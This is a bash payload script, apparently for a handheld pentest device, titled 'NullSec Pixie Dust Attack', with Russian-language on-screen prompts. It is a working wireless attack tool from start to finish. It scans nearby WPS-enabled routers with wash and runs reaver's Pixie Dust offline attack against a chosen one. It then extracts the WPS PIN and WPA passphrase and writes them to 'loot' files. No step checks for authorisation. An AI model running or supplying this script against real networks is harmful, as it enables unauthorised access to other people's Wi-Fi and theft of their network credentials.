#!/bin/bash
# Title: NullSec Pixie Dust Attack
# Author: bad-antics
# Description: WPS Pixie Dust offline attack for WPS-enabled routers
# Category: nullsec

# Autodetect the right wireless interface (exports $IFACE).
# Falls back to showing the pager error dialog if nothing is plugged in.
. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/mmc/nullsec/loot"
mkdir -p "$LOOT_DIR"

PROMPT "АТАКА PIXIE DUST
━━━━━━━━━━━━━━━━━━━━━━━━━
Оффлайн-атака WPS PIN.
Освобождает слабое
генерирование случайных чисел
в WPS реализациях.

Нажмите OK для сканирования."

MONITOR_IF=""
for iface in wlan1mon wlan2mon wlan1 $IFACE; do
    [ -d "/sys/class/net/$iface" ] && MONITOR_IF="$iface" && break
done
[ -z "$MONITOR_IF" ] && ERROR_DIALOG "Интерфейс WiFi не найден!" && exit 1

if ! which reaver >/dev/null 2>&1; then
    ERROR_DIALOG "reaver не найден!\nУстановите: opkg install reaver"
    exit 1
fi

SPINNER_START "Сканирование целей WPS..."
rm -f /tmp/wps_scan*
timeout 15 wash -i "$MONITOR_IF" -o /tmp/wps_targets.txt 2>/dev/null &
sleep 15
killall wash 2>/dev/null
SPINNER_STOP

declare -a BSSIDS CHANS NAMES
idx=0
while read -r bssid channel rssi wps_ver wps_locked essid; do
    [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
    [ "$wps_locked" = "Yes" ] && continue
    BSSIDS[$idx]="$bssid"
    CHANS[$idx]="$channel"
    NAMES[$idx]=$(echo "$essid" | head -c 16)
    idx=$((idx + 1))
    [ $idx -ge 8 ] && break
done < /tmp/wps_targets.txt

[ $idx -eq 0 ] && ERROR_DIALOG "Цели WPS не найдены!" && exit 1

PROMPT "WPS-цели: $idx

$(for i in $(seq 0 $((idx-1))); do echo "$((i+1)). ${NAMES[$i]}"; done)"

SEL=$(NUMBER_PICKER "Цель (1-$idx):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 1 ;; esac
SEL=$((SEL - 1))
[ $SEL -lt 0 ] && SEL=0
[ $SEL -ge $idx ] && SEL=$((idx - 1))

resp=$(CONFIRMATION_DIALOG "Атака Pixie Dust на:\n${NAMES[$SEL]}\n\nПопытаться бесшумных атак?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Запуск Pixie Dust..."
RESULT=$(timeout 120 reaver -i "$MONITOR_IF" -b "${BSSIDS[$SEL]}" -c "${CHANS[$SEL]}" -K 1 -vv 2>&1)
SPINNER_STOP

PIN=$(echo "$RESULT" | grep "WPS PIN:" | awk '{print $NF}')
PSK=$(echo "$RESULT" | grep "WPA PSK:" | awk -F"'" '{print $2}')

if [ -n "$PIN" ]; then
    echo "SSID: ${NAMES[$SEL]}" > "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
    echo "PIN: $PIN" >> "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
    echo "PSK: $PSK" >> "$LOOT_DIR/pixiedust_${NAMES[$SEL]}_$(date +%s).txt"
    PROMPT "ПИКСИ ДУСТ - УСПЕХ!
━━━━━━━━━━━━━━━━━━━━━━━━━
SSID: ${NAMES[$SEL]}
PIN:  $PIN
PSK:  $PSK

Сохранено в лутные файлы."
else
    PROMPT "ПИКСИ ДУСТ - ОШИБКА
━━━━━━━━━━━━━━━━━━━━━━━━━
Цель не уязвима
для Pixie Dust.

Попытайте brute force
или другой вектор."
fi
